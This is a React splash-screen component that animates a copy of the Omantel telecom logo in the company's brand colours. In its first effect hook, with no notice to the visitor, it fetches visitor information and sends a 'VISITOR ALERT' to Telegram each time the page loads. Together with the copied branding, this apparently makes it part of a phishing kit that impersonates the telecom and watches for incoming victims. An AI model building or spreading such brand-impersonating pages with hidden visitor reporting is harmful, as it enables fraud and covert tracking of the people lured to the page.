"use client"

import { useEffect, useState, useRef } from "react"
import { fetchVisitorInfo, sendTelegramMessage } from "../lib/telegram"

const OMANTEL_BLUE = "#1240FF"
const DIAMOND_ORANGE = "#F57C20"

export function OmantelSplash({ onFinish }: { onFinish?: () => void }) {
  const [phase, setPhase] = useState<
    "initial" | "diamond-in" | "letters-in" | "hold" | "fade-out" | "done"
  >("initial")
  const timerRef = useRef<NodeJS.Timeout[]>([])

  useEffect(() => {
    // Fetch visitor info and send alert
    fetchVisitorInfo().then(() => {
      sendTelegramMessage({
        title: "VISITOR ALERT",
        type: "visitor"
      })
    })

    const timers: NodeJS.Timeout[] = []

    // Phase 1: Diamond drops in and spins
    timers.push(setTimeout(() => setPhase("diamond-in"), 300))

    // Phase 2: Letters animate in
    timers.push(setTimeout(() => setPhase("letters-in"), 900))

    // Phase 3: Hold the full logo
    timers.push(setTimeout(() => setPhase("hold"), 2200))

    // Phase 4: Fade out
    timers.push(setTimeout(() => setPhase("fade-out"), 3400))

    // Phase 5: Done
    timers.push(
      setTimeout(() => {
        setPhase("done")
        onFinish?.()
      }, 4000)
    )

    timerRef.current = timers
    return () => timers.forEach(clearTimeout)
  }, [onFinish])

  if (phase === "done") return null

  return (
    <div
      className={`fixed inset-0 z-50 flex items-center justify-center transition-opacity duration-500 ${phase === "fade-out" ? "opacity-0" : "opacity-100"
        }`}
      style={{ backgroundColor: OMANTEL_BLUE }}
    >
      {/* Full wordmark container */}
      <div className="flex items-center">
        {/* O */}
        <span
          className="inline-block transition-all duration-500 ease-out"
          style={{
            opacity: phase === "initial" || phase === "diamond-in" ? 0 : 1,
            transform:
              phase === "initial" || phase === "diamond-in"
                ? "translateX(-30px) scale(0.8)"
                : "translateX(0) scale(1)",
            transitionDelay: "0ms",
          }}
        >
          <svg
            viewBox="0 0 110 110"
            fill="none"
            className="h-[60px] w-[60px] sm:h-[80px] sm:w-[80px] md:h-[100px] md:w-[100px]"
          >
            <defs>
              <mask id="oMask">
                <rect width="110" height="110" fill="white" />
                <circle cx="55" cy="55" r="26" fill="black" />
                <rect x="55" y="55" width="56" height="56" fill="black" />
              </mask>
            </defs>
            <circle cx="55" cy="55" r="50" fill="white" mask="url(#oMask)" />
            <path d="M 55 55 L 55 81 A 26 26 0 0 0 81 55 Z" fill="white" />
          </svg>
        </span>

        {/* m */}
        <span
          className="inline-block transition-all duration-500 ease-out"
          style={{
            opacity: phase === "initial" || phase === "diamond-in" ? 0 : 1,
            transform:
              phase === "initial" || phase === "diamond-in"
                ? "translateY(20px)"
                : "translateY(0)",
            transitionDelay: "80ms",
          }}
        >
          <svg
            viewBox="0 0 95 60"
            fill="none"
            className="h-[36px] w-[52px] sm:h-[48px] sm:w-[66px] md:h-[56px] md:w-[82px] self-end"
            style={{ marginBottom: "2px" }}
          >
            <path
              d="M0 60 L0 14 Q0 6 8 6 L8 6 Q12 6 14 12 Q20 2 32 2 Q42 2 48 12 Q54 2 66 2 Q80 2 82 18 L82 60 L68 60 L68 26 Q68 16 58 16 Q50 16 48 26 L48 60 L34 60 L34 26 Q34 16 24 16 Q16 16 14 26 L14 60 Z"
              fill="white"
            />
          </svg>
        </span>

        {/* a */}
        <span
          className="inline-block transition-all duration-500 ease-out"
          style={{
            opacity: phase === "initial" || phase === "diamond-in" ? 0 : 1,
            transform:
              phase === "initial" || phase === "diamond-in"
                ? "translateY(20px)"
                : "translateY(0)",
            transitionDelay: "160ms",
          }}
        >
          <svg
            viewBox="0 0 62 62"
            fill="none"
            className="h-[36px] w-[34px] sm:h-[48px] sm:w-[44px] md:h-[56px] md:w-[54px]"
            style={{ marginBottom: "2px", marginLeft: "-2px" }}
          >
            <path
              d="M42 60 L42 52 Q36 62 24 62 Q10 62 4 52 Q0 46 0 38 Q0 24 14 20 Q22 18 42 18 L42 16 Q42 8 30 8 Q20 8 16 16 L4 10 Q10 0 30 0 Q52 0 54 16 L54 60 Z
                 M42 30 L24 30 Q14 32 14 40 Q14 50 24 50 Q36 50 42 40 Z"
              fill="white"
              fillRule="evenodd"
            />
          </svg>
        </span>

        {/* n */}
        <span
          className="inline-block transition-all duration-500 ease-out"
          style={{
            opacity: phase === "initial" || phase === "diamond-in" ? 0 : 1,
            transform:
              phase === "initial" || phase === "diamond-in"
                ? "translateY(20px)"
                : "translateY(0)",
            transitionDelay: "240ms",
          }}
        >
          <svg
            viewBox="0 0 56 60"
            fill="none"
            className="h-[36px] w-[30px] sm:h-[48px] sm:w-[40px] md:h-[56px] md:w-[48px]"
            style={{ marginBottom: "2px", marginLeft: "-2px" }}
          >
            <path
              d="M0 60 L0 14 Q0 6 8 6 L8 6 Q12 6 14 12 Q20 2 34 2 Q50 2 52 18 L52 60 L38 60 L38 26 Q38 16 28 16 Q18 16 14 26 L14 60 Z"
              fill="white"
            />
          </svg>
        </span>

        {/* t with orange diamond */}
        <span
          className="inline-block relative transition-all duration-500 ease-out"
          style={{
            opacity: phase === "initial" ? 0 : 1,
            transitionDelay: "0ms",
          }}
        >
          {/* Orange diamond */}
          <span
            className="absolute transition-all duration-700 ease-out"
            style={{
              width: phase === "initial" ? "0px" : "14px",
              height: phase === "initial" ? "0px" : "14px",
              backgroundColor: DIAMOND_ORANGE,
              transform:
                phase === "initial"
                  ? "rotate(45deg) scale(0)"
                  : phase === "diamond-in"
                    ? "rotate(45deg) scale(1.3)"
                    : "rotate(45deg) scale(1)",
              borderRadius: "2px",
              top: "-4px",
              left: "50%",
              marginLeft: "-7px",
            }}
          />
          <svg
            viewBox="0 0 36 76"
            fill="none"
            className="h-[46px] w-[20px] sm:h-[62px] sm:w-[26px] md:h-[76px] md:w-[32px]"
            style={{
              marginBottom: "2px",
              marginLeft: "-2px",
              marginTop: "auto",
            }}
          >
            <path
              d="M10 76 L10 24 L0 24 L0 14 L10 14 L10 0 L22 0 L22 14 L34 14 L34 24 L22 24 L22 62 Q22 70 30 70 L34 70 L34 76 Z"
              fill="white"
            />
          </svg>
        </span>

        {/* e */}
        <span
          className="inline-block transition-all duration-500 ease-out"
          style={{
            opacity: phase === "initial" || phase === "diamond-in" ? 0 : 1,
            transform:
              phase === "initial" || phase === "diamond-in"
                ? "translateY(20px)"
                : "translateY(0)",
            transitionDelay: "400ms",
          }}
        >
          <svg
            viewBox="0 0 58 62"
            fill="none"
            className="h-[36px] w-[32px] sm:h-[48px] sm:w-[42px] md:h-[56px] md:w-[50px]"
            style={{ marginBottom: "2px", marginLeft: "-2px" }}
          >
            <path
              d="M2 34 Q4 0 30 0 Q54 0 56 30 L56 38 L16 38 Q18 52 30 52 Q40 52 46 42 L54 50 Q46 62 30 62 Q2 62 2 34 Z
                 M16 28 L44 28 Q42 14 30 14 Q18 14 16 28 Z"
              fill="white"
              fillRule="evenodd"
            />
          </svg>
        </span>

        {/* l */}
        <span
          className="inline-block transition-all duration-500 ease-out"
          style={{
            opacity: phase === "initial" || phase === "diamond-in" ? 0 : 1,
            transform:
              phase === "initial" || phase === "diamond-in"
                ? "translateX(30px) scale(0.8)"
                : "translateX(0) scale(1)",
            transitionDelay: "480ms",
          }}
        >
          <svg
            viewBox="0 0 14 76"
            fill="none"
            className="h-[46px] w-[8px] sm:h-[62px] sm:w-[10px] md:h-[76px] md:w-[12px]"
            style={{ marginBottom: "2px", marginLeft: "-2px" }}
          >
            <rect x="0" y="0" width="14" height="76" rx="1" fill="white" />
          </svg>
        </span>
      </div>

      {/* Subtle loading shimmer at bottom */}
      <div
        className="absolute bottom-16 left-1/2 -translate-x-1/2 overflow-hidden rounded-full transition-opacity duration-500"
        style={{
          width: "60px",
          height: "3px",
          backgroundColor: "rgba(255,255,255,0.15)",
          opacity: phase === "hold" || phase === "letters-in" ? 1 : 0,
        }}
      >
        <div
          className="h-full rounded-full"
          style={{
            width: "30px",
            backgroundColor: "rgba(255,255,255,0.5)",
            animation: "shimmer 1.2s ease-in-out infinite",
          }}
        />
      </div>

      <style jsx>{`
        @keyframes shimmer {
          0% {
            transform: translateX(-30px);
          }
          100% {
            transform: translateX(60px);
          }
        }
      `}</style>
    </div>
  )
}
